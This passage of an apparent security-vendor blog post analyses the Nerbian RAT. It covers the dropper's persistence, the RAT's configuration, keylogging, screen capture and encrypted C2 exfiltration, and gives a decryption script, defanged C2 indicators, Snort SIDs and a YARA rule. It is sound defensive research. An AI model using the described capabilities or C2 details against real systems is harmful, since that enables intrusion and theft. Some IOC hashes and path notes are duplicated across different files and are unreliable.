6fnZtdur2E14xcGlGinhd7EDv1vtabuZVBIVrAgVuJFOFweOyDMZ3ZxGrhvZHFrxaXckvqeku7ljCM1FQKotX7qxhDJBLp/1O/Foi1qiE5mcQs8vm8zhfBwEKhUMtTLRgnNDC/MI9+UY4ptz3Tpl4DEFrYI4EIw7jyjytIQ1fOeVWD5zCApw4D9IUXY0aYDkwJNaJZ6AoVUaJfsbGx/MOyqwQIDgBMirpy9UpdQ13yWhJZFXrZzQr2EmopUBg7HNOZcioVJU9Z6EuwsjR4dHcgBDvCsadnpuGlY5f1eKDAjuc7VNqFPGWjeg19wTRKP11nujBfNIhaaBPDtmoF6ktYeoQQQgghhASjLBxVp1ucQXXegTrC4tSr8w5wao8ciujMxgbSiDN1pohnKOXCedYXhqHOxDgihw+GXQGnUKsaEKsMvjWoM5tg2K7DukIORxF1qDRA2qUNGc9hAE8dBujL0lIohET8sXjva70IVxBduOboGY4KDgBMioJmMEidQfbJBHpUacFeQi1FgHAUCc8pC32h3GRlYfAu/0caNlVpKLD/De8oTp6ySb2mvhCaoi8koCWMueO5jkw2gxYQPKMwWF/C0iOEEEIIISQYZRfrPnv62ejBaPRR6+LD8ffH1b12inQ6jaMt/nS+nOZjzTpVV4cW8vm8zpgpFAoDbw6cSJyIRqNNjzSlv03bD+0UhqFAkFC4V8CpWueL+NYSmPp0KncnN3C+dClmiYY6nNd1ujpisZKWwgfC1WhDIQ3DQOC+ul+wtNR9ttpLmmUHsPBSVPZONpEoFcLc2dtZlRbsJdTaCp5TDtaXafBwy5W7K3BsdbUwsK4rvuN/g6j/MCrUK/RlXZS7bl16vXxvuffl3vmv5nO5HOLnSCQCaYC+bDyXHiGEEEIIIcEoC0dxWl26vZSaTMWOxkYvj8Yfj+PoqWUy5c+GWVv3/zWIzj90zn05N3JpJP1VOnsriwOuXct3GGOXxwbfGkR0geO4LtrK4OvqLl642Ptar+ezZBHj6ZSTWp6FU402FMIwqqT6vnpe7IEa259p1/kt460oM1uxVzBqnrLZyvLgU1Mp/WlPkdXihbIAwXzubsBnF5nU69kXOgqFrIt4W0+2YoRra2vzN+erf46RYErPpUcIIYQQQkgwKp6s22B9AYK4KJPO4IQ9d9N6CApIJBK573PBzqA4Gdet67QNYtGht4fanm6LHIpEDkbUk1dKGIah6H6+GyKcszvOdOgihVjLxMyNmex32aE3a3jmUDgcXr2vYwwQOMZwIg/DU4dbAQEVQt/q4+pgDhA/Gk+nSw/CWUwvxo85giKDvXxqiQiK8pyy0JePlb0GHz4YRi/wbfUSFx2nO2DlQsEj6g4wZbkvBJ+T1ydbnmpBurWlFWn7OUZbUa9x6RFCCCGEEFI7ZeHo1PWp8Q/Hs99mEXWMfzSOA3ficX1VXveZ7tjhWPvpdhx/EZbgVD3+frU/g9kcb566MYUj+9pa6bs7nInVAz8RPPSd74O0WGwhDKNEQ13qeir9TXrov3X8VlUtL4YuDPW81FPTd5KtJ1sXvl5A9Ij06N9HnYMPjDwMTx3uJMEcoPfV3omPJyY/nszdyQ2/O5z+Ot33un4cq2AvoZYvtSpK6EuwsjB4RGsQoSlUhH9CS/YTj5FAiNv2dBu0BxE6tUXBpiz0heATTSEQRbrtt21IQzNKtBX1WlQsPUIIIYQQQgKiL/IrMvvFbMtvWnBiDoVCiScS059Na0GR5eXlrrNdiJcgjR+P21LhiS+KxfRi4smE9bXV5mNgVWHLUy2RSARBzuBbgzijIxhTImEY9uM9VTZ5zfrpjtk563mh8uBNqIe+YGo6X87YB2NoUGfKsULHcNga/J8HnVP21YYn8jCApw4D9GU/18dmyfFcH7SGtJP4Y/oxPMDkAEBQFEKmyKEIZhc7GoO9dKmfvUy1FMKjjCoVJU8ZCH2ZrCwPHo2gEA3iBXBs5/W0yz8sd52xdAgpdHvlqjYlEIYhqNfUF1rDHPM/Wo9onr85j7RzGAH6EpYeIYQQQgghwajHfzhW/mJpbWk9kTihnia6i+yRYRBCCCGEEELIjlFx7+gviUKh0PZM265fc7hHhkEIIYQQQgghO8kv/dtRQgghhBBCCCG7wi/621FCCCGEEEIIIbtDXd3/AvYcUXZ0SB+QAAAAAElFTkSuQmCC" style="max-width:80%;height:auto;width:auto;"/></p>
<p>The dropper's end-goal is to download the executable named SSL, save it as MoUsoCore.exe, and configure a scheduled task to run it hourly as its primary persistence mechanism.</p>
<h3>Payload - MoUsoCore.exe</h3>
<p>MoUsoCore.exe is the name of the payload that the dropper binary, UpdateUAV.exe, attempts to download and establish persistence for. Like the dropper itself, it is written in Go, and is UPX packed. The size of the binary in its packed state is 5.6MB, while in its unpacked state is 9.2MB.</p>
<h3>Functionality and Configuration Settings</h3>
<p>Nerbian RAT seems to support a variety of different functions, most of which are dictated by encrypted configuration settings in the binary itself. Proofpoint identified various configuration settings this sample utilizes:</p>
<p>"185.121.139[.]249"
https://www[.]fernandestechnical[.]com/pub/health_check.php
8ffe450597cbbfa5a703e23a8b6bbdaeda76badf2b035e75de5ffdb3af07270d
"100"
\\\\ProgramData\\\\Microsoft OneDrive\\\\setup
"rev.sav"</p>
<p>===Configuration===
default_communication_protocol: %s
default_conn_interval: %d
b_use_alive_signal: %t
start_worktime: %d
end_worktime: %d
alive_interval: %d
b_use_secondary_host: %t
b_use_sleep_filetransfer: %t
time_sleep_filetransfer: %d
retry_count_filetransfer: %d
connection_error_sleep_time: %d
bpreflaged_use_backupserver: %t
flagged_time_backupserver: %s
switch_backupserver_time: %d
primary_host: %s
secondary_host: %s
primary_http_proxyserver: %s
secondary_http_proxyserver: %s
working_directory: %s
b_run_cmd_result_outfile: %t
idle_state_limit_time: %d
st:%d
nt: %d</p>
<p>Many of these strings pertain to setting operating parameters for the malware such as what hosts it communicates with, how often it checks in to the C2 domains and IP addresses with keep-alive messages, the malware’s preferred working directory, and the hours in which it operates, in addition to other parameters.</p>
<p>It's likely that 185[.]121[.]139[.]249 and hxxps://www[.]fernandestechnical[.]com/pub/health_check.php are the designated C2 backup domains and URI for keep-alives and check-ins.</p>
<h3>Keylogging</h3>
<p>The RAT appears to have the ability to log keystrokes and appears to write them, encrypted, to the rev.sav file mentioned in the configuration settings above.</p>
<h3>Screen Capture</h3>
<p>Not unlike the dropper, the RAT utilizes a lot of pre-existing Go code to perform many of its functions:</p>
<p>github.com/lxn/win
github.com/go-ole/go-ole
github.com/StackExchange/wmi
github.com/digitalocean/go-smbios/smbios
github.com/AllenDang/w32.init</p>
<p>Again, out of all of these, one of the more interesting external references is to the following GitHub repo:</p>
<p> github.com/kbinani/screenshot/ </p>
<p>This repo is a Go library for performing screen captures on a variety of different operating systems.</p>
<h3>C2 Communications</h3>
<p>As with most modern malware families, this RAT prefers to handle its communications over SSL. Proofpoint observed two types of network traffic. The first is a simple Heartbeat/Keep-Alive to the C2 domains/IP addresses.</p>
<p><img alt="C2 domain/IP addresses" height="143" src="https://www.proofpoint.com/sites/default/files/inline-images/Screen%20Shot%202022-05-10%20at%209.00.31%20AM.png" width="409"/></p>
<p>Figure 9: The Heartbeat/Keep-alive traffic to the C2 domain/IP addresses. Please disregard the extra "p" at the end of /pub/health_check.php.</p>
<p>Additional communication observed was a POST request to the configured C2 domains and IP addresses with a large collection of HTTP form data being uploaded in the request:</p>
<p><img alt="base64 " height="536" src="https://www.proofpoint.com/sites/default/files/inline-images/Screen%20Shot%202022-05-10%20at%209.00.47%20AM.png" style="max-width:800px;height:auto;width:auto;" width="1152"/></p>
<p>Figure 10: Notice the different names in the Content-Disposition field for each form in this POST request. All of this data is both base64 encoded and encrypted, regardless of whether the C2 communication is happening over HTTP or HTTPS.</p>
<p>Form-data names being posted to the C2 server include:</p>
<p>addr_post – IP address posting to</p>
<p>port_post – network port posting to</p>
<p>auth_post – likely a per-session encryption key or password used after initializing the C2 communication</p>
<p>session_key – the only field that isn't encrypted. This is a combination of a string that serves as a sort of campaign identifier, a hash of values retrieved via the SMBIOS Golang module, and the operating system designation of the system talking to the C2 server (in this case "windows"). </p>
<p>data_post – exfiltrated data from the victim host</p>
<p>All of the fields above, with exception of session_key form data field, utilize a unique encryption scheme. The first 70 bytes of the POST are "garbage", while the next 24 bytes contain an AES key that can be used to decrypt the remaining data. Proofpoint researchers developed a Python script that will enable decrypting this posted data:</p>
<p>import malduck
import binascii</p>
<p>
data = "BgxxweBaPoZVPcfLoQFSHMfqqeitJaZjoSKOBrhsCxtDMYGxPUHsKYcXetaTSJaSULtqZQAwoDiTrCtDpVKvaLxjZPSLcLBvlyREEguzuO0Z8119x2/7cc2XoU2w=="</p>
<p>
def decrypt_post_param(base64_encoded_content):
 junk = base64_encoded_content[:70]
 key = base64_encoded_content[70:70+32]
 print("[+] key: %s" % key)
 crypted_data = base64_encoded_content[70+32:].encode("utf-8")
 base64_decoded = malduck.base64.decode(crypted_data)
 iv = key[:16].encode("utf-8")
 full_data = base64_decoded
 print("[+] crypted data [%d]: %s" % (len(full_data), binascii.hexlify(full_data)))
 return malduck.aes.cbc.decrypt(key.encode("utf-8"), iv, full_data)
 </p>
<p>print(decrypt_post_param(data)) </p>
<p><img alt="Python script " height="160" src="https://www.proofpoint.com/sites/default/files/inline-images/Screen%20Shot%202022-05-10%20at%209.01.03%20AM.png" style="max-width:800px;height:auto;width:auto;" width="908"/></p>
<p>Figure 11: Python script for decrypting posted data. </p>
<p>Using the code above, users can decrypt the data being posted. In this instance, Proofpoint chose to decrypt the base64 encoded data from the addr_post field from an internal sandbox run. Users will need to replace the data variable with the base64 encoded block they wish to decrypt, or otherwise modify the script to accept input.</p>
<p>As mentioned above however, the session_key field is not encrypted, it is base64 encoded. What does this field contain?</p>
<p><img alt="session key" height="369" src="https://www.proofpoint.com/sites/default/files/inline-images/Screen%20Shot%202022-05-10%20at%209.01.16%20AM.png" style="max-width:800px;height:auto;width:auto;" width="1101"/></p>
<p>Figure 12: The value of the session_key field is just a concated string, containing three values that are base64 encoded.</p>
<p>When submitted to Cyberchef using the From Base64 recipe, the base64 encoded string:</p>
<p>OGZmZTQ1MDU5N2NiYmZhNWE3MDNlMjNhOGI2YmJkYWVkYTc2YmFkZjJiMDM1ZTc1ZGU1ZmZkYjNhZjA3MjcwZDoyNWI0ZWJjYTRiYmM4MmFiNWFlMmU1MTdjMjlkMzNlNzp3aW5kb3dz</p>
<p>Decodes to:</p>
<p>8ffe450597cbbfa5a703e23a8b6bbdaeda76badf2b035e75de5ffdb3af07270d:25b4ebca4bbc82ab5ae2e517c29d33e7:windows</p>
<p>This string contains three values, concatenated and delimited with the ":" character. Proofpoint assesses the first value, 8ffe450597cbbfa5a703e23a8b6bbdaeda76badf2b035e75de5ffdb3af07270d is some sort of an implant or campaign identifier, while 25b4ebca4bbc82ab5ae2e517c29d33e7 is a value derived from host identifier data collected using the <a href="https://github.com/digitalocean/go-smbios/smbios" rel="noopener noreferrer" target="_blank">go-smbios</a> library mentioned above, while the final value is the operating system of the compromised host (windows)</p>
<p><img alt="Nerbian RAT " height="363" src="https://www.proofpoint.com/sites/default/files/inline-images/Screen%20Shot%202022-05-10%20at%209.01.28%20AM.png" style="max-width:800px;height:auto;width:auto;" width="1078"/></p>
<p>Figure 13: The process flow of Nerbian RAT</p>
<h3>Assessment</h3>
<p>This is a complex piece of malware, consisting of three stages:</p>
<ul><li>Maldoc phishing lure</li>
<li>Dropper that performs a large variety of environment checking – anti-reversing and anti-VM checks</li>
<li>Nerbian RAT – encrypted configuration file, extreme care to ensure data is encrypted to the C2</li>
</ul><p>Despite all this complexity and care being taken to protect the data in transit and "vet" the compromised host, the dropper and the RAT itself do not employ heavy obfuscation outside of the sample being packed with UPX, which it can be argued isn't necessarily for obfuscation, but to simply reduce the size of the executable.</p>
<p>Additionally, much of the functionality of both the RAT and the dropper are easy to infer due to the strings referring to GitHub repositories – specifically the Chacal and screenshot repositories exposes partial functionality of both the dropper and the RAT.</p>
<h3>Why Nerbian RAT?</h3>
<p>At first it was hard to find any references to "Nerbian" on the internet, until Proofpoint analysts came across this passage in Don Quixote:</p>
<p>“But turn thine eyes to the other side, and thou shalt see in front and</p>
<p> in the van of this other army the ever victorious and never vanquished</p>
<p> Timonel of Carcajona, prince of New Biscay, who comes in armour with</p>
<p> arms quartered azure, vert, white, and yellow, and bears on his shield</p>
<p> a cat or on a field tawny with a motto which says Miau, which is the</p>
<p> beginning of the name of his lady, who according to report is the</p>
<p> peerless Miaulina, daughter of the duke Alfeniquen of the Algarve; the</p>
<p> other, who burdens and presses the loins of that powerful charger</p>
<p> and bears arms white as snow and a shield blank and without any</p>
<p> device, is a novice knight, a Frenchman by birth, Pierres Papin by</p>
<p> name, lord of the baronies of Utrique; that other, who with</p>
<p> iron-shod heels strikes the flanks of that nimble parti-coloured</p>
<p> zebra, and for arms bears azure vair, is the mighty duke of Nerbia,</p>
<p> Espartafilardo del Bosque, who bears for device on his shield an</p>
<p> asparagus plant with a motto in Castilian that says, Rastrea mi</p>
<p> suerte."</p>
<p>Nerbia is a fictional place from the great novel Don Quixote. The knight from Nerbia had a shield with a crest of asparagus and a banner reading "Try your luck".</p>
<p><img alt="Nerbian RAT " height="654" src="https://www.proofpoint.com/sites/default/files/inline-images/Screen%20Shot%202022-05-10%20at%209.02.06%20AM.png" style="max-width:800px;height:auto;width:auto;" width="705"/></p>
<p>Figure 14: Nerbia is a fictional land from the novel Don Quixote. The Knight of Nerbia wore a shield with an asparagus crest with a Castilian Spanish motto that reads "Rastrea Mi Suerte." Which roughly translates to "Try your luck." In English. Please note that this crest is not associated with the novel and was created because Threat Research at Proofpoint likes to have fun.</p>
<p>Many of the strings referencing Nerbia were located in the companion dropper (UpdateUAV.exe). There are no references to Nerbia in the RAT payload itself (MoUsoCore.exe). Proofpoint assesses with high confidence that the dropper and RAT were both created by the same entity, and while the dropper may be modified to deliver different payloads in the future, the dropper is statically configured to download and establish persistence for this specific payload at the time of analysis.</p>
<h3>Indicators of Compromise</h3>
<table class="MsoTableGrid" width="720"><tbody><tr><td valign="top">
<p>Filename</p>
</td>
<td valign="top">
<p>covid-19.doc</p>
</td>
</tr><tr><td valign="top">
<p>MD5 Hash</p>
</td>
<td valign="top">
<p>f0d3cff26b419aff4acfede637f6d3a2</p>
</td>
</tr><tr><td valign="top">
<p>SHA1 Hash</p>
</td>
<td valign="top">
<p>af6ee983a8e085fec67b19bfa3a0a042658a3740</p>
</td>
</tr><tr><td valign="top">
<p>SHA256 Hash</p>
</td>
<td valign="top">
<p>bb975fed53a9fa18a4234b90ffbd489429ea03a91245dad030fe4053f465ec28</p>
</td>
</tr></tbody></table><p> </p>
<table class="MsoTableGrid" width="720"><tbody><tr><td valign="top">
<p>Filename</p>
</td>
<td valign="top">
<p>UpdateUAV.exe</p>
</td>
</tr><tr><td valign="top">
<p>MD5 Hash</p>
</td>
<td valign="top">
<p>9cca59eec5af63e42cd845b67cf6df89</p>
</td>
</tr><tr><td valign="top">
<p>SHA1 Hash</p>
</td>
<td valign="top">
<p>af6ee983a8e085fec67b19bfa3a0a042658a3740</p>
</td>
</tr><tr><td valign="top">
<p>SHA256 Hash</p>
</td>
<td valign="top">
<p>bb975fed53a9fa18a4234b90ffbd489429ea03a91245dad030fe4053f465ec28</p>
</td>
</tr><tr><td valign="top">
<p>Notes</p>
</td>
<td valign="top">
<p>Downloaded from hxxps://www[.]fernandestechnical[.]com/pub/media/gitlog via Powershell Invoke Web Request (IWR) to C:\Users\[current_user]\Appdata\Roaming\UpdateUAV.exe
64-bit golang executable, UPX packed</p>
</td>
</tr></tbody></table><p> </p>
<table class="MsoTableGrid"><tbody><tr><td valign="top">
<p>Filename</p>
</td>
<td valign="top">
<p>MoUsoCore.exe</p>
</td>
</tr><tr><td valign="top">
<p>MD5 Hash</p>
</td>
<td valign="top">
<p>5d5bc970f975341558b8d2c225ca0115</p>
</td>
</tr><tr><td valign="top">
<p>SHA1 Hash</p>
</td>
<td valign="top">
<p>4f74826ed56cda233cfc12b86fd1b7da4a9f2e56</p>
</td>
</tr><tr><td valign="top">
<p>SHA256 Hash</p>
</td>
<td valign="top">
<p>902c65435b6b44cfda1156b0e7c6a30b2785fa4f2cbb9b1944a66f5146ec7aa5</p>
</td>
</tr><tr><td valign="top">
<p>Notes</p>
</td>
<td valign="top">
<p>Downloaded from hxxps://www[.]fernandestechnical[.]com/pub/media/gitlog via Powershell Invoke Web Request (IWR) to C:\Users\[current_user]\Appdata\Roaming\UpdateUAV.exe
64-bit golang executable, UPX packed</p>
</td>
</tr></tbody></table><p> </p>
<table class="MsoTableGrid" width="720"><tbody><tr><td valign="top">
<p>Domain</p>
</td>
<td valign="top">
<p>www[.]fernandestechnical[.]com</p>
</td>
</tr><tr><td valign="top">
<p>Notes</p>
</td>
<td valign="top">
<p>hxxps://www[.]fernandestechnical[.]com/pub/health_check.php</p>
</td>
</tr></tbody></table><p> </p>
<table class="MsoTableGrid"><tbody><tr><td valign="top">
<p>IP Address</p>
</td>
<td valign="top">
<p>185[.]121[.]139[.]249</p>
</td>
</tr><tr><td valign="top">
<p>Notes</p>
</td>
<td valign="top">
<p>Additional IP address identified in the Nerbian RAT (MoUsoCore.exe) configuration.</p>
</td>
</tr></tbody></table><h1>Detection</h1>
<p>Network</p>
<p>Snort and Suricata rules are available in the ETOPEN ruleset under SIDs:
2036426 - ET MALWARE Nerbian RAT CnC Checkin
2036427 - ET MALWARE Nerbian RAT Data Exfiltration</p>
<p>Static</p>
<p>The Yara rule below should provide host-based static detection of the RAT payload:</p>
<p>rule Nerbian_RAT</p>
<p>{</p>
<p> meta: </p>
<p> author = "ptrouerbach"</p>
<p> reference = "5e6c5a9fda2d20125f6f24e37e8a217a39ff0a5cfddc07ddfdb18049d9ea4597"</p>
<p> malfamily = "NerbianRAT"</p>
<p> </p>
<p> strings:</p>
<p> $args_p = "p-" ascii</p>
<p> $args_s = "s-" ascii</p>
<p> $args_h = "h-" ascii</p>
<p> $args_P = "P-" ascii</p>
<p> </p>
<p> $hardcoded_aes_key = { 17E87F581F1DF8D6129D65FD50CEB3DD6C4E1C223077CD7D4C595DA6C3DF92B2 } </p>
<p> </p>
<p> $param_auth = "auth_post" ascii</p>
<p> $param_session = "session_key" ascii</p>
<p> $param_data = "data_post" ascii</p>
<p> $param_addr = "addr_post" ascii</p>
<p> $param_port = "port_post" ascii</p>
<p> </p>
<p> condition:</p>
<p> uint16be(0) == 0x4D5A </p>
<p> and ($hardcoded_aes_key or (all of ($param*) and all of ($args*)))</p>
<p> and filesize &lt; 10MB</p>
<p>}</p>
<p>Additional Acknowledgements</p>
<p>Proofpoint security researchers would like to thank security researcher pr0xylife sharing his observations of this threat on social media.</p>
<a href="https://www.proofpoint.com/us/blog/threat-insight/bumblebee-is-still-transforming" hreflang="en">Previous Blog Post</a>
<p>Subscribe to the Proofpoint Blog</p>
*Business Email:Select*Blog Interest:AllArchiving and ComplianceCISO PerspectivesCloud SecurityCorporate NewsEmail and Cloud ThreatsInformation ProtectionInsider Threat ManagementRemote Workforce ProtectionSecurity Awareness TrainingSecurity BriefsThreat Insight
</div>